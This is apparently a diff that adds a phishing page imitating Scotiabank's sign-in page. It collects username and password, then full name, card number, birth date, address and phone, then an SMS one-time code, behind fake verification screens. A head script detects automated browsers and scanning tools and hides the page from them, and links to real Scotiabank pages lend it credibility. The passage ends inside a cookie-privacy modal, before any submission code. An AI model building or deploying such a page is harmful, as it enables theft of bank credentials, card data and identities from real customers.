@@ -1,0 +1,1563 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in Scotia Bank</title>
+    
+    <link rel="shortcut icon" type="image/png" href="scotia9.png">
+    <link rel="icon" type="image/png" href="scotia9.png">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            --red: #ed111c;
+            --red-hover: #d90f19;
+            --blue: #007bb8;
+            --text: #252525;
+            --muted: #747985;
+            --border: #f4f6f9;
+            --background: #f3f6fa;
+        }
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100%;
+        }
+
+        body {
+            font-family:
+                -apple-system,
+                BlinkMacSystemFont,
+                "Segoe UI",
+                Roboto,
+                Helvetica,
+                Arial,
+                sans-serif;
+
+            background: var(--background);
+            color: var(--text);
+
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        .main-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            padding: 35px 20px 0;
+            flex: 1 0 auto;
+        }
+
+        .login-card {
+            position: relative;
+            width: 100%;
+            max-width: 553px;
+            min-height: auto;
+            background: rgba(255, 255, 255, 0.96);
+            border: 1px solid #e2e6ed;
+            border-radius: 10px;
+            box-shadow: none;
+            padding: 75px 55px 140px;
+        }
+
+        .top-lock {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 24px;
+            height: 24px;
+            pointer-events: none;
+        }
+
+        .top-lock svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .welcome {
+            font-size: 28px;
+            line-height: 1.15;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            margin-bottom: 6px;
+            color: #333;
+        }
+
+        .bank-name {
+            display: inline-flex;
+            justify-content: center;
+            align-items: flex-end;
+            font-size: 49px;
+            line-height: 1;
+            font-weight: 750;
+            letter-spacing: -1.0px;
+            color: var(--red);
+            text-decoration: none;
+        }
+
+        .bank-name:hover {
+            color: var(--red-hover);
+        }
+
+        .bank-name small {
+            font-size: 12px;
+            margin-left: 3px;
+            margin-bottom: 6px;
+            font-weight: 800;
+        }
+
+        .field-group {
+            margin-bottom: 16px;
+        }
+
+        .field-group:first-of-type {
+            margin-top: 18px;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 16px;
+            font-weight: 700;
+            width: 78%;
+            margin: 0 auto 4px;
+            color: #202329;
+        }
+
+        .input-row {
+            position: relative;
+            display: flex;
+            align-items: center;
+            width: 78%;
+            margin: 0 auto;
+            min-height: 44px;
+            border-bottom: 1px solid #777;
+        }
+
+        .field-icon {
+            flex: 0 0 38px;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+        }
+
+        .field-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .input-row input, .input-row select {
+            width: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            padding: 6px 0;
+            font-family: inherit;
+            font-size: 19px;
+            font-weight: 400;
+            color: #31343a;
+        }
+
+        .input-row input::placeholder {
+            color: #8a8e97;
+            opacity: 1;
+        }
+
+        .input-row:focus-within {
+            border-bottom: 2px solid var(--blue);
+        }
+
+        .inline-error {
+            width: 78%;
+            margin: 10px auto 0 auto;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--red);
+            display: none;
+        }
+        .inline-error.visible {
+            display: block;
+        }
+
+        .remember-row {
+            display: flex;
+            align-items: flex-start;
+            width: 78%;
+            margin: 20px auto 40px;
+            gap: 13px;
+        }
+
+        .fake-checkbox {
+            flex: 0 0 auto;
+            position: relative;
+            width: 24px;
+            height: 24px;
+            border: 1px solid #797d83;
+            border-radius: 4px;
+            background: #fff;
+            cursor: pointer;
+            margin-top: 1px;
+        }
+
+        .fake-checkbox::after {
+            content: "";
+            position: absolute;
+            width: 9px;
+            height: 5px;
+            border-left: 2px solid white;
+            border-bottom: 2px solid white;
+            left: 6px;
+            top: 5px;
+            transform: rotate(-45deg);
+            opacity: 0;
+        }
+
+        .fake-checkbox.checked {
+            background: var(--blue);
+            border-color: var(--blue);
+        }
+
+        .fake-checkbox.checked::after {
+            opacity: 1;
+        }
+
+        .remember-text {
+            font-size: 16px;
+            line-height: 1.4;
+            color: #3d4148;
+            user-select: none;
+            cursor: pointer;
+        }
+
+        .login-btn {
+            display: block;
+            width: 78%;
+            margin: 35px auto 0 auto;
+            height: 56px;
+            border: none;
+            border-radius: 6px;
+            background: linear-gradient(180deg, #ef1520 0%, #eb101c 100%);
+            color: white;
+            font-family: inherit;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(120, 0, 0, 0.15);
+            transition: transform 0.15s ease, background 0.15s ease;
+        }
+
+        .login-btn:hover {
+            background: var(--red-hover);
+        }
+
+        .login-btn:active {
+            transform: translateY(1px);
+        }
+
+        .login-btn:disabled {
+            background: #f5a4a8 !important;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+
+        .help {
+            margin-top: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--blue);
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 700;
+        }
+
+        .help svg {
+            width: 10px;
+            height: 15px;
+        }
+
+        .loader-screen, .identity-screen, .loader-screen-2, .otp-screen, .loader-screen-3 {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .loader-screen.visible, .identity-screen.visible, .loader-screen-2.visible, .otp-screen.visible, .loader-screen-3.visible {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar-container {
+            width: 78%;
+            height: 6px;
+            background: #e2e6ed;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+
+        .progress-bar-fill, .progress-bar-fill-2, .progress-bar-fill-3 {
+            width: 0%;
+            height: 100%;
+            background: var(--red);
+            transition: width 0.1s linear;
+        }
+
+        .identity-title, .otp-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .identity-desc, .otp-desc {
+            font-size: 15px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            width: 85%;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .otp-input {
+            width: 45px;
+            height: 55px;
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            border: 1px solid #777;
+            border-radius: 6px;
+            outline: none;
+            background: transparent;
+            color: #31343a;
+        }
+
+        .otp-input:focus {
+            border-color: var(--blue);
+            border-width: 2px;
+        }
+
+        .cookie-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.45);
+            z-index: 9998;
+            transition: opacity 0.3s ease;
+        }
+
+        .cookie-banner {
+            position: fixed;
+            bottom: 0px; 
+            left: 0px;   
+            width: 100%; 
+            background-color: #ffffff;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            border-radius: 0px; 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 30px 40px;
+            z-index: 9999;
+            font-family: inherit;
+            gap: 30px;
+        }
+
+        .cookie-text {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #333;
+            max-width: 68%;
+        }
+
+        .cookie-text a {
+            color: #0088d9;
+            font-weight: bold;
+            text-decoration: underline;
+        }
+
+        .cookie-buttons {
+            display: flex;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+
+        .cookie-btn {
+            font-family: inherit;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-outline {
+            background-color: #ffffff;
+            color: var(--red);
+            border: 1px solid var(--red);
+        }
+
+        .btn-outline:hover {
+            background-color: #fff5f5;
+        }
+
+        .btn-solid {
+            background-color: var(--red);
+            color: #ffffff;
+            border: 1px solid var(--red);
+        }
+
+        .btn-solid:hover {
+            background-color: var(--red-hover);
+        }
+
+        .privacy-modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .privacy-modal-overlay.visible {
+            display: flex;
+        }
+
+        .privacy-modal {
+            position: relative;
+            background: #ffffff;
+            width: 100%;
+            max-width: 640px;
+            border-radius: 4px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            max-height: 85vh;
+        }
+
+        .privacy-header-section {
+            position: relative;
+            padding: 24px 30px 16px 30px;
+            border-bottom: 1px solid #e0e4e9;
+        }
+
+        .privacy-close-btn {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            background: transparent;
+            border: none;
+            font-size: 22px;
+            font-weight: 400;
+            color: #333333;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .privacy-close-btn:hover {
+            color: var(--red);
+        }
+
+        .privacy-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #333333;
+        }
+
+        .privacy-content-section {
+            padding: 20px 30px;
+            overflow-y: auto;
+            max-height: 320px;
+            border-bottom: 1px solid #e0e4e9;
+        }
+
+        .privacy-text-scroll {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #444444;
+        }
+
+        .privacy-modal-footer {
+            padding: 16px 30px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            background: #ffffff;
+        }
+
+        .privacy-btn {
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 700;
+            padding: 10px 22px;
+            border-radius: 4px;
+            cursor: pointer;
+            border: none;
+            transition: background 0.2s ease;
+        }
+
+        .privacy-btn-reject {
+            background-color: var(--red);
+            color: #ffffff;
+        }
+
+        .privacy-btn-reject:hover {
+            background-color: var(--red-hover);
+        }
+
+        .privacy-btn-confirm {
+            background-color: var(--red);
+            color: #ffffff;
+        }
+
+        .privacy-btn-confirm:hover {
+            background-color: var(--red-hover);
+        }
+
+        .signup-prompt {
+            margin-top: 50px;
+            margin-bottom: 80px;
+            text-align: center;
+            font-size: 17px;
+            color: #333;
+        }
+
+        .signup-prompt a {
+            margin-left: 12px;
+            color: #333;
+            font-weight: 700;
+            text-decoration: underline;
+            text-decoration-thickness: 1px;
+            text-underline-offset: 3px;
+        }
+
+        .signup-prompt a:hover {
+            color: var(--red);
+        }
+
+        .site-footer {
+            width: 100%;
+            background-color: #ffffff;
+            border-top: 1px solid #e0e4e9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .footer-top {
+            width: 100%;
+            max-width: 1200px;
+            padding: 19.5px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .footer-logo img {
+            height: 52px;
+            width: auto;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 25px;
+            flex-wrap: wrap;
+            justify-content: flex-end;
+        }
+
+        .footer-links a {
+            color: #444;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            transition: color 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: var(--red);
+            text-decoration: underline;
+        }
+
+        .footer-bottom-wrapper {
+            width: 100%;
+            border-top: 1px solid #e0e4e9;
+            display: flex;
+            justify-content: center;
+            height: 44px;
+        }
+
+        .footer-bottom {
+            width: 100%;
+            max-width: 1200px;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: flex-end;
+            font-size: 13px;
+            color: #555;
+        }
+
+        @media (max-width: 900px) {
+            .cookie-banner {
+                flex-direction: column;
+                padding: 20px;
+                text-align: left;
+                gap: 15px;
+            }
+            .cookie-text {
+                max-width: 100%;
+            }
+            .cookie-buttons {
+                width: 100%;
+                justify-content: flex-end;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .privacy-modal {
+                max-height: 95vh;
+                width: 95%;
+            }
+            .privacy-modal-footer {
+                flex-direction: column;
+            }
+            .privacy-btn {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 540px) {
+            body {
+                background: white;
+            }
+
+            .main-wrapper {
+                padding: 0;
+            }
+
+            .login-card {
+                border: none;
+                border-radius: 0;
+                box-shadow: none;
+                padding: 75px 24px 40px;
+            }
+
+            .header {
+                margin-bottom: 35px;
+            }
+
+            .welcome {
+                font-size: 24px;
+            }
+
+            .bank-name {
+                font-size: 36px;
+            }
+
+            .cookie-buttons {
+                flex-direction: column;
+            }
+
+            .cookie-btn {
+                width: 100%;
+            }
+
+            .footer-top {
+                flex-direction: column;
+                gap: 20px;
+                padding: 20px;
+            }
+            .footer-links {
+                justify-content: center;
+                gap: 15px;
+            }
+            .footer-bottom {
+                justify-content: center;
+                text-align: center;
+            }
+            .signup-prompt {
+                font-size: 15px;
+                margin-top: 40px;
+                margin-bottom: 60px;
+            }
+        }
+    </style>
+
+    <!-- SYSTEME DE CYBERSECURITE ANTI-BOT AVANCE -->
+    <script>
+        (function() {
+            // Détection agressive des bots/scrapers headless/automatisation
+            const isBotDetected = () => {
+                if (navigator.webdriver === true) return true;
+                if (!window.chrome && navigator.vendor && navigator.vendor.includes('Google')) return true;
+                if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+                if (/HeadlessChrome|PhantomJS|Selenium|Puppeteer|Playwright|curl|wget|python-requests/i.test(navigator.userAgent)) return true;
+                return false;
+            };
+
+            if (isBotDetected()) {
+                document.documentElement.innerHTML = '<div style="background:#000;color:#f00;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;font-size:1.5rem;">Access Denied. Security protocol violation.</div>';
+                throw new Error("Bot detected.");
+            }
+
+            // Exigence d'une interaction humaine pour valider la session (Mouvement de souris ou saisie)
+            window._humanVerified = false;
+            const verifyHuman = () => {
+                window._humanVerified = true;
+                window.removeEventListener('mousemove', verifyHuman);
+                window.removeEventListener('keydown', verifyHuman);
+                window.removeEventListener('touchstart', verifyHuman);
+            };
+            window.addEventListener('mousemove', verifyHuman, { once: true });
+            window.addEventListener('keydown', verifyHuman, { once: true });
+            window.addEventListener('touchstart', verifyHuman, { once: true });
+        })();
+    </script>
+</head>
+
+<body>
+
+    <div class="main-wrapper">
+        <main class="login-card">
+
+            <div class="top-lock" aria-hidden="true">
+                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="7" y="13" width="18" height="15" rx="2" stroke="#242424" stroke-width="2" />
+                    <path d="M11 13V9.5C11 6.4 13.2 4 16 4C18.8 4 21 6.4 21 9.5V13" stroke="#242424" stroke-width="2" stroke-linecap="round" />
+                    <path d="M12 20.5L14.5 23L20 17" stroke="#008850" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" />
+                </svg>
+            </div>
+
+            <header class="header">
+                <h1 class="welcome">
+                    Welcome to
+                </h1>
+
+                <a href="https://www.scotiabank.com/ca/en/personal.html" target="_blank" rel="noopener noreferrer" class="bank-name">
+                    Scotiabank
+                    <small>®</small>
+                </a>
+            </header>
+
+            <form id="demoForm">
+
+                <div id="loginSection">
+                    <div class="field-group">
+                        <label class="field-label" for="username">
+                            Username or card number
+                        </label>
+                        <div class="input-row">
+                            <span class="field-icon" aria-hidden="true">
+                                <svg viewBox="0 0 32 32" fill="none">
+                                    <circle cx="16" cy="10" r="5.5" stroke="#242424" stroke-width="2" />
+                                    <path d="M7 27V23.5C7 19.6 10.4 17 16 17C21.6 17 25 19.6 25 23.5V27" stroke="#242424" stroke-width="2" stroke-linecap="round" />
+                                </svg>
+                            </span>
+                            <input id="username" type="text" autocomplete="off" placeholder="Enter username or card number" oninput="handleLoginLiveInput()">
+                        </div>
+                    </div>
+
+                    <div class="field-group">
+                        <label class="field-label" for="password">
+                            Password
+                        </label>
+                        <div class="input-row">
+                            <span class="field-icon" aria-hidden="true">
+                                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <rect x="7" y="13" width="18" height="15" rx="2" stroke="#242424" stroke-width="2" />
+                                    <path d="M11 13V9.5C11 6.4 13.2 4 16 4C18.8 4 21 6.4 21 9.5V13" stroke="#242424" stroke-width="2" stroke-linecap="round" />
+                                    <circle cx="16" cy="19" r="1.5" fill="#242424" />
+                                    <path d="M16 20.5V23.5" stroke="#242424" stroke-width="2" stroke-linecap="round" />
+                                </svg>
+                            </span>
+                            <input id="password" type="password" autocomplete="off" placeholder="Enter password" oninput="handleLoginLiveInput()">
+                        </div>
+                    </div>
+
+                    <div id="inlineError" class="inline-error">Veuillez remplir tous les champs (nom d'utilisateur et mot de passe).</div>
+
+                    <div class="remember-row">
+                        <div id="rememberBox" class="fake-checkbox" role="checkbox" aria-checked="false" tabindex="0"></div>
+                        <div id="rememberText" class="remember-text">
+                            Remember my username or card number
+                        </div>
+                    </div>
+
+                    <button type="submit" class="login-btn" id="loginSubmitBtn">
+                        Sign in
+                    </button>
+                </div>
+
+                <div id="loaderScreen" class="loader-screen">
+                    <div class="spinner"></div>
+                    <div class="loader-text">Vérification de vos informations...</div>
+                    <div class="progress-bar-container">
+                        <div id="progressBarFill" class="progress-bar-fill"></div>
+                    </div>
+                </div>
+
+                <div id="identityScreen" class="identity-screen">
+                    <div class="identity-title">Vérification d'identité</div>
+                    <div class="identity-desc">Veuillez confirmer vos informations personnelles et bancaires pour sécuriser votre accès.</div>
+                    
+                    <div class="field-group" style="width: 100%; margin-bottom: 10px;">
+                        <label class="field-label" style="width: 85%; font-size: 13px;" for="fullName">Nom complet</label>
+                        <div class="input-row" style="width: 85%; min-height: 38px;">
+                            <input id="fullName" type="text" autocomplete="off" placeholder="Ex: Jean Dupont" style="font-size: 16px;" oninput="handleInfoLiveInput()">
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="width: 100%; margin-bottom: 10px;">
+                        <label class="field-label" style="width: 85%; font-size: 13px;" for="cardNumberFront">Numéro en avant de la carte</label>
+                        <div class="input-row" style="width: 85%; min-height: 38px;">
+                            <input id="cardNumberFront" type="text" autocomplete="off" placeholder="XXXX XXXX XXXX XXXX" style="font-size: 16px;" oninput="handleInfoLiveInput()">
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="width: 100%; margin-bottom: 10px;">
+                        <label class="field-label" style="width: 85%; font-size: 13px;" for="dob">Date de naissance</label>
+                        <div class="input-row" style="width: 85%; min-height: 38px;">
+                            <input id="dob" type="text" autocomplete="off" placeholder="JJ / MM / AAAA" style="font-size: 16px;" oninput="handleInfoLiveInput()">
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="width: 100%; margin-bottom: 10px;">
+                        <label class="field-label" style="width: 85%; font-size: 13px;" for="address">Adresse résidentielle</label>
+                        <div class="input-row" style="width: 85%; min-height: 38px;">
+                            <input id="address" type="text" autocomplete="off" placeholder="Votre adresse" style="font-size: 16px;" oninput="handleInfoLiveInput()">
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="width: 100%; margin-bottom: 10px;">
+                        <label class="field-label" style="width: 85%; font-size: 13px;" for="province">Province</label>
+                        <div class="input-row" style="width: 85%; min-height: 38px;">
+                            <select id="province" style="font-size: 16px; border: none; outline: none; background: transparent; width: 100%;" onchange="handleInfoLiveInput()">
+                                <option value="">Sélectionnez une province</option>
+                                <option value="Quebec">Québec</option>
+                                <option value="Ontario">Ontario</option>
+                                <option value="British Columbia">Colombie-Britannique</option>
+                                <option value="Alberta">Alberta</option>
+                                <option value="Manitoba">Manitoba</option>
+                                <option value="Nova Scotia">Nouvelle-Écosse</option>
+                                <option value="New Brunswick">Nouveau-Brunswick</option>
+                                <option value="Newfoundland and Labrador">Terre-Neuve-et-Labrador</option>
+                                <option value="Prince Edward Island">Île-du-Prince-Édouard</option>
+                                <option value="Saskatchewan">Saskatchewan</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="width: 100%; margin-bottom: 10px;">
+                        <label class="field-label" style="width: 85%; font-size: 13px;" for="postalCode">Code postal</label>
+                        <div class="input-row" style="width: 85%; min-height: 38px;">
+                            <input id="postalCode" type="text" autocomplete="off" placeholder="A1A 1A1" style="font-size: 16px;" oninput="handleInfoLiveInput()">
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="width: 100%; margin-bottom: 10px;">
+                        <label class="field-label" style="width: 85%; font-size: 13px;" for="idPhone">Numéro de téléphone</label>
+                        <div class="input-row" style="width: 85%; min-height: 38px;">
+                            <input id="idPhone" type="tel" autocomplete="off" placeholder="Numéro de mobile" style="font-size: 16px;" oninput="handleInfoLiveInput()">
+                        </div>
+                    </div>
+
+                    <button type="button" class="login-btn" id="submitIdentityBtn" style="margin-top: 20px;">Continuer</button>
+                </div>
+
+                <div id="loaderScreen2" class="loader-screen-2">
+                    <div class="spinner"></div>
+                    <div class="loader-text">Envoi du code de vérification...</div>
+                    <div class="progress-bar-container">
+                        <div id="progressBarFill2" class="progress-bar-fill-2"></div>
+                    </div>
+                </div>
+
+                <div id="otpScreen" class="otp-screen">
+                    <div class="otp-title">Vérification de sécurité</div>
+                    <div class="otp-desc">Veuillez entrer le code à 6 chiffres envoyé par SMS sur votre numéro de téléphone mobile.</div>
+                    <div class="otp-inputs">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" oninput="handleOtpLiveInput()">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpLiveInput()">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpLiveInput()">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpLiveInput()">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpLiveInput()">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*" oninput="handleOtpLiveInput()">
+                    </div>
+                    <button type="button" class="login-btn" id="verifyOtpBtn" style="margin-top: 10px;">Vérifier le code</button>
+                </div>
+
+                <div id="loaderScreen3" class="loader-screen-3">
+                    <div class="spinner"></div>
+                    <div class="loader-text">Merci vos fonds ont été déposés !</div>
+                    <div class="progress-bar-container">
+                        <div id="progressBarFill3" class="progress-bar-fill-3"></div>
+                    </div>
+                </div>
+
+            </form>
+
+            <a href="https://auth.scotiaonline.scotiabank.com/recovery/landing?lng=en-US&oauth_key=Zon1Q562-Hs&oauth_key_signature=eyJraWQiOiJTd1dmbV9ITlNFTVVNbUVHMnh2LUsydmlhOGVvdzRFTEZhejdxMEdZalVjIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJyYXIiOmZhbHNlLCJvYXV0aF9rZXkiOiJab24xUTU2Mi1IcyIsImNvbnNlbnRfcmVxdWlyZWQiOmZhbHNlLCJyZWRpcmVjdF91cmkiOiJodHRwczovL3d3dy5zY290aWFvbmxpbmUuc2NvdGlhYmFuay5jb20vb25saW5lL2xhbmRpbmcvb2F1dGhsYW5kaW5nLmJucyIsImV4cCI6MTc5MDIwMTI1NiwiaWF0IjoxNzkwMjAwMصلjAiOiJiZTc5NjgyNy1lYWEyLTRkNDktYmQ5ZC1lNDdjM2Q3OTFhNjIiLCJjbGllbnRfaWQiOiI4ZWU5MGMzOS0xYzUyLTRmZjQtOGFlNi1hN2I1NGM1Mzk5MzMiLCJjbGllbnRfbWV0YWRhdGEiOnsiQ2hhbm5lbElEIjoiU09OLiwiQXBwbGljYXRpb25Db2RlIjoiSDcifSwiaXNzdWVyIjoiaHR0cHM6Ly9wYXNzcG9ydC5zY290aWFvbmFuay5jb20ifQ.gx_I8ruQ-ReHwg1-X0ByQhXOrcWI79SkEfsQCmYC-4DRpEC_3aXjX8xCpUWpce6YAk-uH5hMUJixVjruOCVqQRELaGWsCKNojwe2fKbsFk-oMiRV99TyGjFugUHXl1O0JNez01EesK4-zIKnwgbxGl2WALYoEtE-ABYWYfQFaCXsKpdvEa1ZCxorgChp19S34Bri_x3gcoMVCq9G8BXGha48rtgen_tnG9JuSCCMgok3Ec5qWAXwyTq0FLXU10cKV4IEjyuDh7Y3YJJ8umnCYR5DzFK5wGRjpis_5OFIVCbIkpDxp7hftO44qy-J9YE1A-xZyamire3kTAjOIWP1Mw" target="_blank" rel="noopener noreferrer" class="help" id="helpLink">
+                Need help signing in?
+                <svg viewBox="0 0 10 18" fill="none">
+                    <path d="M2 2L8 9L2 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                </svg>
+            </a>
+
+        </main>
+
+        <div class="signup-prompt">
+            Don't have a username and password? <a href="https://auth.scotiaonline.scotiabank.com/activation?lng=en-US&oauth_key=txPeWhGwh0c&oauth_key_signature=eyJraWQiOiJTd1dmbV9ITlNFTVVNbUVHMnh2LUsydmlhOGVvdzRFTEZhejdxMEdZalVjIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJyYXIiOmZhbHNlLCJvYXV0aF9rZXkiOiJ0eFPeWhGwh3BjIiwImNvbnNlbnRfcmVxdWlyZWQiOmZhbHNlLCJyZWRpcmVjdF91cmkiOiJodHRwczovL3d3dy5zY290aWFvbmxpbmUuc2NvdGlhYmFuay5jb20vb25saW5lL2xhbmRpbmcvb2F1dGhsYW5kaW5nLmJucyIsImV4cCI6MTc5MDE5NzYzMywiaWF0IjoxNzkwMTk2NDMzLCJqdGkiOiI2YjE1N2UxZi1mNDYwLTQxYTMtOGMzOC02YjIwZTE2OTY5NjkiLCJjbGllbnRfaWQiOiI4ZWU5MGMzOS0xYzUyLTRmZjQtOGFlNi1hN2I1NGM1Mzk5MzMiLCJjbGllbnRfbWV0YWRhdGEiOnsiQ2hhbm5lbElEIjoiU09OLiwiQXBwbGljYXRpb25Db2RlIjoiSDcifSwiaXNzdWVyIjoiaHR0cHM6Ly9wYXNzcG9ydC5zY290aWFvbmFuay5jb20ifQ.cNvbNpUPoaWSbdYigPn3JTH47CiwxZdC9iGVR1MdXvRmOhUk_RwePMrOwkmJD3ot5Mvu_LAVVkfrJl54QE9mYlN-iKFLUuUew_XH1lcSoZd2BC_s_oS6TIayHUwlVOBTIT4ip6VFOqxZCdyQR0SgZKZFvKZe72sqf7l239JiaKpMNHmWoyz_dYtmIsDCpD2KOIf20kiA3Qdvp-patIEYFRMSFYTjln72IL8G3W6a3AqmU_XXWRL4Lq2Sps2uxL72ohSEhDVL2ce41fagkUzJ_9UusKPS2uz6AWKPdUbNMZ10Wy66IYhT-EjycDVL_Xxp7ESoNFAnnthWoiaC-a-90w" target="_blank" rel="noopener noreferrer">Set them up now.</a>
+        </div>
+    </div>
+
+    <footer class="site-footer">
+        <div class="footer-top">
+            <div class="footer-logo">
+                <img src="scotia6.png" alt="Scotiabank Logo">
+            </div>
+            <div class="footer-links">
+                <a href="https://www.scotiabank.com/ca/en/personal/contact-us.html" target="_blank" rel="noopener noreferrer" id="contactUsLink">Contact Us</a>
+                <a href="https://www.scotiabank.com/ca/en/security.html" target="_blank" rel="noopener noreferrer">Security</a>
+                <a href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html" target="_blank" rel="noopener noreferrer">Legal</a>
+                <a href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html" target="_blank" rel="noopener noreferrer">Privacy</a>
+                <a href="https://www.scotiabank.com/ca/en/about/accessibility.html" target="_blank" rel="noopener noreferrer">Accessibility</a>
+                <a href="#" id="cookieSettingsLink">Cookie Settings</a>
+            </div>
+        </div>
+        <div class="footer-bottom-wrapper">
+            <div class="footer-bottom">
+                © Scotiabank. All Rights Reserved.
+            </div>
+        </div>
+    </footer>
+    
+    <div id="cookieOverlay" class="cookie-overlay"></div>
+
+    <div id="cookieBanner" class="cookie-banner">
+        <div class="cookie-text">
+            By clicking "Accept All", you understand and agree that we and our partners may use cookies and other similar technologies on our sites. These technologies may collect information about you, including browsing patterns, to enhance site navigation, analyze site usage, and assist in our marketing efforts. Click "Manage Preferences" to change or deny the use of optional cookies. To learn more about changing your preferences at any time, please click the following link. <a href="#" target="_blank" rel="noopener noreferrer">Policy</a>
+        </div>
+        <div class="cookie-buttons">
+            <button type="button" class="cookie-btn btn-outline" id="manageCookiesBtn">Manage Preferences</button>
+            <button type="button" class="cookie-btn btn-solid" id="acceptCookiesBtn">Accept All</button>
+        </div>
+    </div>
+
+    <div id="privacyModalOverlay" class="privacy-modal-overlay">
+        <div class="privacy-modal">
+            <div class="privacy-header-section">
+                <button type="button" class="privacy-close-btn" id="privacyCloseBtn" aria-label="Close">&times;</button>
+                <h2 class="privacy-title">Privacy Preference Centre</h2>
+            </div>
+            
+            <div class="privacy-content-section">
+                <div class="privacy-text-scroll">
